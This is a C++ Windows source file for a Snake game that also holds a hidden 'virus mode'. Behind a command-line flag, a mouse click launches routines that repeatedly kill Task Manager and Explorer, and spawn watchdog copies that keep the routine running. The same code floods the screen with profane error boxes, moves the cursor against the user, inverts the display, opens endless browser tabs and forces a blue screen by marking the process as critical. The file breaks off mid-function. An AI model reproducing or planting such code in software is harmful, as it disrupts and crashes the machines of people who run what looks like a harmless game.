// CMySnake_GUI.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "CMySnake_GUI.h"
#include "../../resource/tool.h"

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名
string sid;                                     // 当前账号sid
bool VirusModeEnabled;                          // Enable Virus Mode

struct {
	long x; //x
	long y; //y
	long w; //width
	long h; //height
} windflag;

#pragma warning(push)
#pragma warning(disable: 26495)
namespace SnakeGame {
	using uint = UINT;
	using Food = POINT;
	constexpr int rect_length = 20;
	class Window {
	public:
		Window() {
			hwnd = NULL;
			cols = rows = 0;
		};
		~Window() = default;
	public:
		HWND hwnd;
		unsigned cols, rows;
	};

	typedef struct {
		time_t timestamp;
		size_t score;
	} Record;

	typedef struct {
		DWORD speed;
		bool exitondie;
		bool pauseonesc;
	} SnakeConf;

	class Snake{
	public: // std const func
		Snake() {
			hThread_snakerun = NULL;
			score = 0;
		};
		~Snake() = default;
	protected: //var
		HANDLE hThread_snakerun;
		struct {
			POINT point;
			enum _facing_t { W, A, S, D } facing;
		} head;
		deque<POINT> body;
		Food nextFood;
		unsigned long long score;
		static unsigned int __stdcall RunSnake(void*);
		static RECT GetRectFromPoint(POINT pt);
		Food MakeFood();
	public: //publicd-func
		SnakeConf cf;
		Window window;
		bool InitSnake();
		void PrintSnake(HDC hdc);
		void pause(bool pause = true) {
			if (pause) SuspendThread(hThread_snakerun);
			else ResumeThread(hThread_snakerun);
		};
		void SaveScore();
		void SetFacing(int facing) {
			head.facing = (decltype(head)::_facing_t)facing;
		}
		unsigned long long GetScore() { return score; };
	};
};
#pragma warning(pop)

//Global Vars
SnakeGame::Snake MySnake;

// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
void                FuckerVirusLaunch();
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    WndProc_PauseDlg(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK    WndProc_DiedDlg(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK    WndProc_OptionsDlg(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK    WndProc_HistoryDlg(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
					 _In_opt_ HINSTANCE hPrevInstance,
					 _In_ LPWSTR    lpCmdLine,
					 _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// TODO: 在此处放置代码。

	// 初始化全局字符串
	LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadStringW(hInstance, IDC_CMYSNAKEGUI, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);
	sid = GetCurrentUserSecurityId();

	// 初始化窗口设置
	::memset(&windflag, 0, sizeof(windflag));
	// 1.加载偏好
	// 检测偏好文件是否存在
	if (!file_exists("./cmysnake/" + sid + "/window.flags")) {
		//建立偏好文件
		create_profile:
		//只找到Unicode版本的mkdir,将就着用吧
		int wm = _wmkdir(L"./cmysnake");
		wm = wm | ((_wmkdir(s2wc("./cmysnake/" + sid))) << 8);
		fstream fp("./cmysnake/" + sid + "/window.flags", ios::out | ios::binary);
		if (!fp) {
			//出错,报错并退出
			int r = MessageBoxW(NULL, L"无法建立文件", L"ERROR", 
				MB_ICONERROR | MB_ABORTRETRYIGNORE);
			if (r == IDABORT) exit(1);
			if (r == IDRETRY) goto create_profile;
			if (r == IDIGNORE) {
				if (MessageBoxA(NULL, "无法忽略!!是否重试?", "不让你忽略",
					MB_ICONERROR | MB_YESNO) == IDYES) goto create_profile;
				else exit(1);
			}
		}
		//使用默认设置
		windflag.x = windflag.y = CW_USEDEFAULT;
		windflag.w = 416;
		windflag.h = 419;
		//写入并关闭文件
		fp.write((char*)&windflag, sizeof(windflag));
		fp.close();
	}
	{
		// 加载偏好
		fstream fp("./cmysnake/" + sid + "/window.flags", ios::in | ios::binary);
		fp.read((char*)&windflag, sizeof(windflag));
		fp.close();
	}
	// 2.使用命令行参数
	// 在后面加载,可以覆盖偏好设置,所以命令行参数优先
	CmdLineA cl(::GetCommandLineA());
	if (cl.getopt("pos-x") || cl.getopt("pos-y") || cl.getopt("width") || cl.getopt("height")) {
		string x, y, w, h;
		cl.getopt("pos-x", x); cl.getopt("pos-y", y);
		cl.getopt("width", w); cl.getopt("height", h);
		decltype(windflag) wf {
			atol(x.c_str()),
			atol(y.c_str()),
			atol(w.c_str()),
			atol(h.c_str()) 
		};
		if (wf.x) windflag.x = wf.x;
		if (wf.y) windflag.x = wf.y;
		if (wf.w) windflag.x = wf.w;
		if (wf.h) windflag.x = wf.h;
	}
	if (cl.getopt("enable-virus-mode")) {
		VirusModeEnabled = true;
	}
	if(cl.getopt("virus")){
		string vt; cl.getopt("virus", vt);
		if (vt == "fucker") {
			FuckerVirusLaunch();
			exit(0);
		}
	}

	// 执行应用程序初始化:
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_CMYSNAKEGUI));

	MSG msg;

	// 主消息循环:
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEXW wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style          = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc    = WndProc;
	wcex.cbClsExtra     = 0;
	wcex.cbWndExtra     = 0;
	wcex.hInstance      = hInstance;
//	wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_CMYSNAKEGUI));
	wcex.hIcon          = NULL;
	wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
//	wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_CMYSNAKEGUI);
	wcex.lpszMenuName   = NULL;
	wcex.lpszClassName  = szWindowClass;
//	wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
	wcex.hIconSm        = NULL;

	return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowExW(0, 
	   szWindowClass, szTitle,
	   WS_OVERLAPPEDWINDOW,
	   windflag.x, windflag.y,
	   windflag.w, windflag.h,
	   nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
	  return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		{
		// 初始化Snake
		// 1. 存储HWND
		MySnake.window.hwnd = hWnd;
		// 2. 获取Window初始大小
		constexpr int _step = SnakeGame::rect_length;
		windflag.w = ((long)(round((double)windflag.w / _step) * _step)) - 5;
		windflag.h = ((long)(round((double)windflag.h / _step) * _step)) - 1;
		::SetWindowPos(hWnd, 0, 0, 0, windflag.w, windflag.h, SWP_NOMOVE | SWP_NOZORDER);
		// 2.1 存入Snake::Window
		MySnake.window.cols = (UINT)round((double)windflag.w / _step);
		MySnake.window.rows = (UINT)round((double)windflag.h / _step);
		// 3. 初始化Snake
		try {
			MySnake.InitSnake();
		}
		catch (exception&e) {
			MessageBoxA(hWnd, e.what(), "Exception", MB_ICONERROR);
			exit(1);
		}
		}
		break;
	case WM_MOVE:
	{
		//更新偏好
		RECT rc;
		GetWindowRect(hWnd, &rc);
		windflag.x = rc.left;
		windflag.y = rc.top;
		break;
	}
	case WM_SIZE:
	{
		//更新偏好
		RECT rc;
		GetWindowRect(hWnd, &rc);
		windflag.w = rc.right - rc.left;
		windflag.h = rc.bottom - rc.top;
		//修正
		constexpr int _step = SnakeGame::rect_length;
		windflag.w = ((long)(round((double)windflag.w / _step) * _step)) - 5;
		windflag.h = ((long)(round((double)windflag.h / _step) * _step)) - 1;
		//最小大小
		if (windflag.w < 215)  windflag.w = 215;
		if (windflag.h < 239)  windflag.h = 239;
		//设置
		::SetWindowPos(hWnd, 0, 0, 0, windflag.w, windflag.h, SWP_NOMOVE | SWP_NOZORDER);
		// 存入Snake::Window
		MySnake.window.cols = (UINT)round((double)windflag.w / _step);
		MySnake.window.rows = (UINT)round((double)windflag.h / _step);
		break;
	}
	case WM_LBUTTONDOWN:
	case WM_RBUTTONDOWN:
		if (VirusModeEnabled) {
			MySnake.pause();
			EnableWindow(hWnd, 0);
			Process.StartOnly(s2ws("\"" + GetProgramDir() + "\" --virus=fucker"));
			exit(0);
		}
		break;
	case WM_KEYDOWN:
	{
		// VK_ESCAPE是ESC
		if (wParam == VK_ESCAPE && MySnake.cf.pauseonesc) {
			MySnake.pause();
			DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG_PAUSED), hWnd, WndProc_PauseDlg);
			MySnake.pause(0);
			break;
		}
		switch (wParam) {
		case 'W':
		case VK_UP:
			MySnake.SetFacing(0);
			break;
		case 'A':
		case VK_LEFT:
			MySnake.SetFacing(1);
			break;
		case 'S':
		case VK_DOWN:
			MySnake.SetFacing(2);
			break;
		case 'D':
		case VK_RIGHT:
			MySnake.SetFacing(3);
			break;
		default:
			break;
		}
		//return DefWindowProc(hWnd, message, wParam, lParam);
		return 0;
		break; // 习惯写上
	}
	case WM_COMMAND:
		{
			int wmId = LOWORD(wParam);
			// 分析菜单选择:
			switch (wmId)
			{
			case IDM_ABOUT:
				DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
				break;
			case IDM_EXIT:
				DestroyWindow(hWnd);
				break;
			default:
				return DefWindowProc(hWnd, message, wParam, lParam);
			}
		}
		break;
	case WM_PAINT:
		{
			PAINTSTRUCT ps;
			HDC hdc = BeginPaint(hWnd, &ps);
			// TODO: 在此处添加使用 hdc 的任何绘图代码...
			{ //画方格
				int w = 0, h = 0;
				constexpr int _step = SnakeGame::rect_length;
				for (h = 0; h < windflag.h; h += _step) {
					for (w = _step; w < windflag.w; w += _step) {
						MoveToEx(hdc, w, 0, NULL);
						LineTo(hdc, w, windflag.h);
					}
					MoveToEx(hdc, 0, h, NULL);
					LineTo(hdc, windflag.w, h);
				}
			}
			MySnake.PrintSnake(hdc);
			EndPaint(hWnd, &ps);
		}
		break;
	case WM_DESTROY:
		// 保存分数
		MySnake.SaveScore();
		//退出啊啊啊啊啊啊
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

// “暂停”框的消息处理程序。
INT_PTR CALLBACK WndProc_PauseDlg(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		SetDlgItemTextA(hDlg, IDC_STATIC_PAUSED_SCORE_SHOW, to_string(MySnake.GetScore())
			.c_str());
		return (INT_PTR)TRUE;
		break;
	case WM_COMMAND:
	{
		int ctlid = LOWORD(wParam);
		if (ctlid == IDCANCEL) {
			EndDialog(hDlg, 0);
			break;
		}
		if (ctlid == IDC_BUTTON_NOSAVE_EXIT) {
			if (MessageBoxA(hDlg, "Do not save and exit?", "Exit Confirm", MB_ICONQUESTION |
				MB_YESNOCANCEL | MB_DEFBUTTON2) == IDYES) exit(0); break;
		}
		if (ctlid == IDC_BUTTON_OPTIONS) {
			DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG_OPTIONS), hDlg, WndProc_OptionsDlg);
		}
		if (ctlid == IDC_BUTTON_HIST) {
			DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG_HISTORY), hDlg, WndProc_HistoryDlg);
		}
		if (ctlid == IDOK) {
			MySnake.SaveScore();
			MessageBoxA(hDlg, ("Your score: " + to_string(MySnake.GetScore())).c_str(),
				"CMySnake_GUI", MB_ICONINFORMATION);
			exit(0);
		}
		break;
	}
	default:
		break;
	}
	return (INT_PTR)FALSE;
}

// “DIED”框的消息处理程序。
INT_PTR CALLBACK WndProc_DiedDlg(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		SetDlgItemTextA(hDlg, IDC_STATIC_SCORE_L, to_string(MySnake.GetScore()).c_str());
		return (INT_PTR)TRUE;
		break;
	case WM_COMMAND:
	{
		int ctlid = LOWORD(wParam);
		MySnake.SaveScore();
		if (ctlid == IDOK) {
			DestroyWindow(MySnake.window.hwnd);
			Process.StartOnly(s2ws(GetProgramDir()));
			exit(0);
		}
		else {
			DestroyWindow(MySnake.window.hwnd);
			exit(0);
		}
		break;
	}
	default:
		break;
	}
	return (INT_PTR)FALSE;
}

// “选项”框的消息处理程序。
INT_PTR CALLBACK WndProc_OptionsDlg(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		SetDlgItemTextA(hDlg, IDC_EDIT_SNAKESPEED, to_string(MySnake.cf.speed).c_str());
		return (INT_PTR)TRUE;
		break;
	case WM_COMMAND:
	{
		int ctlid = LOWORD(wParam);
		if (ctlid == IDCANCEL) {
			EndDialog(hDlg, 0);
			break;
		}
		if (ctlid == IDC_BUTTON_ABOUT) {
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hDlg, About);
		}
		if (ctlid == IDOK) {
			char buffer[260] = { 0 };
			GetDlgItemTextA(hDlg, IDC_EDIT_SNAKESPEED, buffer, 260);
			MySnake.cf.speed = atol(buffer);
			fstream fp2("./cmysnake/" + GetCurrentUserSecurityId() + "/snake.conf.b", 
				ios::out | ios::binary);
			if (!fp2) { // failed
				MessageBoxA(hDlg, "InitError: An error occurred while editing profile.",
					"Error", MB_ICONERROR);
				return false;
			}
			fp2.write((char*)&MySnake.cf, sizeof(MySnake.cf));
			fp2.close();
			EndDialog(hDlg, 0);
			break;
		}
		break;
	}
	default:
		break;
	}
	return (INT_PTR)FALSE;
}

// “历史”框的消息处理程序。
INT_PTR CALLBACK WndProc_HistoryDlg(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		// TODO: Load History Data
		return (INT_PTR)TRUE;
		break;
	case WM_COMMAND:
	{
		int ctlid = LOWORD(wParam);
		if (ctlid == IDCANCEL || ctlid == IDOK) {
			EndDialog(hDlg, 0);
			break;
		}
		break;
	}
	default:
		break;
	}
	return (INT_PTR)FALSE;
}

bool SnakeGame::Snake::InitSnake() {
	// Load Config
	// yinweinaigeshurufabaeigaisidesougourilesuoyizhaxiezhushiyongEnglishxie
	fstream fp("./cmysnake/" + GetCurrentUserSecurityId() + "/snake.conf.b", ios::in|ios::binary);
	if (!fp) { // no config file exists
		// create it...
		fstream fp2("./cmysnake/" + GetCurrentUserSecurityId() + "/snake.conf.b",
			ios::out |ios::binary);
		if (!fp2) { // failed
			throw exception("InitError: An error occurred while creating profile.");
			return false;
		}
		cf.speed = 500;
		cf.exitondie = false;
		cf.pauseonesc = true;
		fp2.write((char*)&cf, sizeof(cf));
		fp2.close();
		// reopen
		fp.open("./cmysnake/" + GetCurrentUserSecurityId() + "/snake.conf.b",ios::in|ios::binary);
	}
	// ok
	fp.read((char*)&cf, sizeof(cf));
	// close file
	fp.close();

	// 创建线程
	hThread_snakerun = (HANDLE)_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>
		(RunSnake), (LPVOID)this, CREATE_SUSPENDED, 0);
	if (!hThread_snakerun) {
		throw exception("InitError: An error occurred while init snake class.");
		return false;
	}
	// 随机选择一个初始位置
	srand((UINT)time(0));
	while (1) {
		// 设为头部节点
		// (希望不要出问题吧。。。)
		head.point.x = (rand() % window.cols) * rect_length;
		head.point.y = (rand() % window.rows) * rect_length;
		// 检测出界
		if (head.point.x > rect_length * (int)window.cols) continue;
		if (head.point.y > rect_length * (int)window.rows) continue;
		break;
	}
	// 要像SIZE那样修正一下
	constexpr int _step = rect_length;
	head.point.x = ((long)(round((double)head.point.x / _step) * _step));
	head.point.y = ((long)(round((double)head.point.y / _step) * _step));

	// 随机选择头部方向
	// 但不能完全随机
	// 需要判断是否离某一边过近
	// 否则一开始就结束
	while (1) {
		srand((UINT)time(0));
		head.facing = (decltype(head)::_facing_t)(rand() % 4);
		if (head.facing == head.W && head.point.y - 1 < 1) continue;
		if (head.facing == head.A && head.point.x - 1 < 1) continue;
		if (head.facing == head.S && head.point.y + 1 > (long)window.rows) continue;
		if (head.facing == head.D && head.point.x + 1 > (long)window.cols) continue;
		break;
	}

	//生成食物节点
	nextFood = MakeFood();

	//启动线程
	ResumeThread(hThread_snakerun);
	return true;
}

SnakeGame::Food SnakeGame::Snake::MakeFood() {
	// 跟头部差不多
	// 就不打注释了
	//srand((UINT)time(0)); //但是这行要去掉,否则会导致随机数一样
	Food fd;
	while (1) {
		fd.x = (rand() % window.cols);
		fd.y = (rand() % window.rows);
		constexpr int _step = rect_length;
		fd.x *= _step;
		fd.y *= _step;
		fd.x = ((long)(round((double)fd.x / _step) * _step));
		fd.y = ((long)(round((double)fd.y / _step) * _step));
		//防止食物和蛇在同一点
		if (!memcmp(&fd, &head.point, sizeof(POINT))) continue;
		//越界检测
		if (fd.x > _step * (((int)window.cols)) - 3 * rect_length) continue;
		if (fd.y > _step * (((int)window.rows)) - 3 * rect_length) continue;
		break;
	}
	return fd;
}

unsigned int __stdcall SnakeGame::Snake::RunSnake(void*the) {
	Snake* theclass = (Snake*)the;
	while (1) {
		// 等待
		Sleep(theclass->cf.speed);
		// 向头部方向扩展一格
		// 1. 存储当前头部位置
		POINT pt = theclass->head.point;
		// 2. 存入body
		theclass->body.push_front(pt);
		// 3. 弹出body最后一个元素
		// 注意!!!如果吃到食物，忽略此操作!
		// 检测是否吃到食物
		if (!memcmp(&theclass->nextFood, &theclass->head.point, sizeof(POINT))) {
			theclass->score += 1;
			theclass->nextFood = theclass->MakeFood();
		}
		else theclass->body.pop_back();
		// 4. 扩展
		constexpr int W = 0, A = 1, S = 2, D = 3;
		switch (theclass->head.facing) {
		case W:
			pt.y -= SnakeGame::rect_length;
			break;
		case A:
			pt.x -= SnakeGame::rect_length;
			break;
		case S:
			pt.y += SnakeGame::rect_length;
			break;
		case D:
			pt.x += SnakeGame::rect_length;
			break;
		default: // what the fuck?
			throw exception(
				"Unexpected value in switch statement."
				"\nAt switch (theclass->head.facing)"
				"\n   while (1)"
				"\n   unsigned int __stdcall SnakeGame::Snake::RunSnake(void*the)"
			);
		}
		theclass->head.point = pt;
		// 5. 检测是否loser
		if (theclass->head.point.x < 0 || theclass->head.point.y < 0 ||
			theclass->head.point.x > rect_length * (int)theclass->window.cols - 2 * rect_length||
			theclass->head.point.y > rect_length * (int)theclass->window.rows - 2 * rect_length
			) { // loser
		loserhandle:
			if (theclass->cf.exitondie) exit(0);
			DialogBoxParamW(hInst, MAKEINTRESOURCEW(IDD_DIALOG_DIED_TIPS), 
				theclass->window.hwnd, WndProc_DiedDlg, 0);
			exit(0);
		}
		// 还有自撞哦
		for (auto i : theclass->body) {
			if (!memcmp(&theclass->head.point, &i, sizeof(POINT))) {
				// loser
				goto loserhandle;
			}
		}
		// 6. 重绘
		// ::SendMessage(theclass->window.hwnd, WM_PAINT, 0, 0);
		RECT wrt; GetWindowRect(theclass->window.hwnd, &wrt);
		SetWindowPos(theclass->window.hwnd, 0, wrt.left, wrt.top,
			wrt.right - wrt.left + 1, wrt.bottom - wrt.top, SWP_NOZORDER);
	}
	return 0;
}

RECT SnakeGame::Snake::GetRectFromPoint(POINT pt) {
	RECT rc;
	rc.left = pt.x;
	rc.top = pt.y;
	rc.right = pt.x + rect_length;
	rc.bottom = pt.y + rect_length;
	return rc;
}

void SnakeGame::Snake::PrintSnake(HDC hdc) {
	HBRUSH black = CreateSolidBrush(RGB(0, 0, 0)); // 草，就这???
	HBRUSH red = CreateSolidBrush(RGB(255, 0, 0)); 
	HBRUSH green = CreateSolidBrush(RGB(0, 255, 0)); 
	RECT rect = GetRectFromPoint(head.point);
	//绘制头部
	FillRect(hdc, &rect, green);
	//绘制食物
	Ellipse(hdc, nextFood.x, nextFood.y, nextFood.x + 20, nextFood.y + 20);
	//绘制身体
	for (auto& i : body) {
		rect = GetRectFromPoint(i);
		//绘制身体
		FillRect(hdc, &rect, black);
	}
}

void SnakeGame::Snake::SaveScore() {
	do {
		// 先保存偏好啦
		fstream fp("./cmysnake/" + sid + "/window.flags", ios::out | ios::binary);
		if (!fp) {
			// 出错那就不管了
			break;
		}
		// 写入并关闭文件
		fp.write((char*)&windflag, sizeof(windflag));
		fp.close();
	} while (0);
	// then save score
	Record rc;
	rc.timestamp = time(0);
	rc.score = score;
	fstream fp("./cmysnake/" + GetCurrentUserSecurityId()+"/scores.hist", ios::app|ios::binary);
	if (!fp) return;
	fp.write((char*)&rc, sizeof(rc));
	fp.close();
}



DWORD __stdcall FuckerVirus_TraceFuckBox(void*) {
	MessageBoxA(NULL, "Fuck you", "Fuck you", MB_ICONERROR);
	return 0;
}

void FuckerVirusLaunch() {
	HWND hWnd = NULL;
	CmdLineA cl(GetCommandLineA());
	if (cl.getopt("watchdog")) {
		vector<ProcessInfo> p;
		size_t l = 0, n = 0;
		while (1) {
			Process.flush();
			Process.find(s2ws(GetProgramInfo().name), p);
			n = p.size();
			p.clear();
			if (n < l) {
				Process.StartOnly(s2ws("\"" + GetProgramDir() +
					"\" --virus=fucker --trace-error-box"));
				Sleep(500);
				Process.StartOnly(s2ws("\"" + GetProgramDir() + "\" --virus=fucker --bsod"));
			} else l = n;
			Sleep(1000);
		}
		exit(0);
	}
	if (cl.getopt("trace-error-box")) {
		vector<HANDLE> ths;
		for (int i = 0; i < 16; ++i) {
			ths.push_back(CreateThread(0, 0, FuckerVirus_TraceFuckBox, 0, 0, 0));
		}
		for (auto& i : ths) {
			WaitForSingleObject(i, MAXDWORD);
		}
		exit(0);
	}
	if (cl.getopt("draw_error_icon")) {
		HWND hwnd = GetDesktopWindow();
		EnableWindow(hwnd, 0);
		HDC hdc = 0;
		POINT pos;
		while (1) {
			GetCursorPos(&pos); hdc = GetWindowDC(hwnd);
			DrawIcon(hdc, pos.x, pos.y, LoadIcon(NULL, IDI_ERROR));
			Sleep(1);
		}
		exit(0);
	}
	if (cl.getopt("kichiku_mouse")) {
		POINT pos;
		while (1) {
			srand((UINT)time(0));
			GetCursorPos(&pos);
			pos.x -= rand() % 5;
			pos.y -= rand() % 5;
			SetCursorPos(pos.x, pos.y);
			Sleep(100);
		}
		exit(0);
	}
	if (cl.getopt("open_bilibili")) {
		while (1) {
			Process.StartOnly(s2ws("explorer https://b23.tv/av" + to_string(rand() % 268435456)));
			Sleep(10000);
		}
		exit(0);
	}
	if (cl.getopt("killtaskmgr")) {
		vector<ProcessInfo> t;
		while (1) {
			Process.find(L"taskmgr.exe", t);
			for (auto i : t) Process.kill(i);
			t.clear();
			Sleep(1000);
		}
		exit(0);
	}
	if (cl.getopt("bsod")) {
		ProcessInfo ifo = Process.GetCurrentProcess();
		ULONG key = 1; long res = 0;
		res = Process.NtSetInformationProcess(static_cast<HANDLE>(ifo),
			(PROCESS_INFORMATION_CLASS)29, &key, sizeof(ULONG));
		if (res >= 0) exit(0);
		else ReStart();
		return;
	}
	if (cl.getopt("uncolor")) {
		HWND hwnd = GetDesktopWindow();
		EnableWindow(hwnd, 0);
		HDC hdc = 0;
		RECT screen;
		SystemParametersInfoA(SPI_GETWORKAREA, 0, &screen, SPIF_SENDCHANGE);
		long cw, ch;
		cw = screen.right - screen.left;
		ch = screen.bottom - screen.top;
		while (1) {
			hdc = GetWindowDC(hwnd);
			BitBlt(hdc, 0, 0, cw, ch, hdc, 0, 0, DSTINVERT);
			Sleep(1000);
		}
		exit(0);
	}
	MessageBoxA(hWnd, "What the fuck?", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Who made you press the mouse??", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "I'm so angry!!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Now", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "What do you want to do?", "Fuck you", MB_ICONERROR);
	if (MessageBoxA(hWnd, "Do you know you're wrong?", "Fuck you", MB_ICONERROR |
		MB_YESNO | MB_DEFBUTTON2) == IDYES) {
		MessageBoxA(hWnd, "But I don't think so!", "Fuck you", MB_ICONERROR);
		MessageBoxA(hWnd, "You hurt me!!", "Fuck you", MB_ICONERROR);
		MessageBoxA(hWnd, "Then you want me to forgive you!", "Fuck you", MB_ICONERROR);
		MessageBoxA(hWnd, "What are you doing??", "Fuck you", MB_ICONERROR);
		MessageBoxA(hWnd, "I'm so angry!!!", "Fuck you", MB_ICONERROR);
		MessageBoxA(hWnd, "I'm so angry!!!", "Fuck you", MB_ICONERROR);
		MessageBoxA(hWnd, "I'm so angry!!!", "Fuck you", MB_ICONERROR);
	}
	else {
		MessageBoxA(hWnd, "What??", "Fuck you", MB_ICONERROR);
		MessageBoxA(hWnd, "Don't you realize what you did wrong??", "Fuck you", MB_ICONERROR);
		MessageBoxA(hWnd, "In that case", "Fuck you", MB_ICONERROR);
		MessageBoxA(hWnd, "Your computer is dying!", "Fuck you", MB_ICONERROR);
		MessageBoxA(hWnd, "This is the last warning!!", "Fuck you", MB_ICONERROR);
		if (MessageBoxA(hWnd, "Do you know you're wrong?", "Fuck you", MB_ICONERROR |
			MB_YESNO | MB_DEFBUTTON2) == IDNO) {
			MessageBoxA(hWnd, "What??", "Fuck you", MB_ICONERROR);
			MessageBoxA(hWnd, "Your computer will be die!", "Fuck you", MB_ICONERROR);
			for (int i = 0; i < 10; ++i) {
				Process.StartOnly(s2ws("\"" + GetProgramDir() + 
					"\" --virus=fucker --watchdog"));
			}
				Process.StartOnly(s2ws("\"" + GetProgramDir() + 
					"\" --virus=fucker --killtaskmgr"));
			Sleep(500);
			Process.StartOnly(s2ws("\"" + GetProgramDir() + 
				"\" --virus=fucker --trace-error-box"));
			Sleep(500);
			Process.StartOnly(s2ws("\"" + GetProgramDir() + 
				"\" --virus=fucker --trace-error-box"));
			Sleep(500);
			Process.StartOnly(s2ws("\"" + GetProgramDir() + 
				"\" --virus=fucker --trace-error-box"));
			Process.StartOnly(s2ws("\"" + GetProgramDir() + 
				"\" --virus=fucker --draw_error_icon"));
			Sleep(2000);
			Process.StartOnly(s2ws("\"" + GetProgramDir() + 
				"\" --virus=fucker --kichiku_mouse"));
			Sleep(5000);
			Process.StartOnly(s2ws("\"" + GetProgramDir() + 
				"\" --virus=fucker --open_bilibili"));
			Sleep(5000);
			Process.StartOnly(s2ws("\"" + GetProgramDir() + 
				"\" --virus=fucker --open_bilibili"));
			Sleep(5000);
			Process.StartOnly(s2ws("\"" + GetProgramDir() +
				"\" --virus=fucker --open_bilibili"));
			Sleep(6000);
			Process.StartOnly(s2ws("\"" + GetProgramDir() + 
				"\" --virus=fucker --uncolor"));
			Sleep(131072);
			vector<ProcessInfo> vh;
			Process.find(L"explorer.exe", vh);
			for (auto j : vh) Process.kill(j);
			Sleep(5000);
			Process.StartOnly(s2ws("\"" + GetProgramDir() + "\" --virus=fucker --bsod"));
			//ExitWindowsEx(EWX_FORCE | EWX_POWEROFF, 0);
		}
	}
	MessageBoxA(hWnd, "Now I want you to click 1024 here!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Are you ready?", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Let's go!", "Fuck you", MB_ICONERROR);
	for (int i = 0; i < 1024; ++i) {
		MessageBoxA(hWnd, to_string(1024 - i).c_str(), "Fuck you", MB_ICONERROR);
	}
	MessageBoxA(hWnd, "OK", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "You clicked 1024", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "So", "Fuck you", MB_ICONERROR);
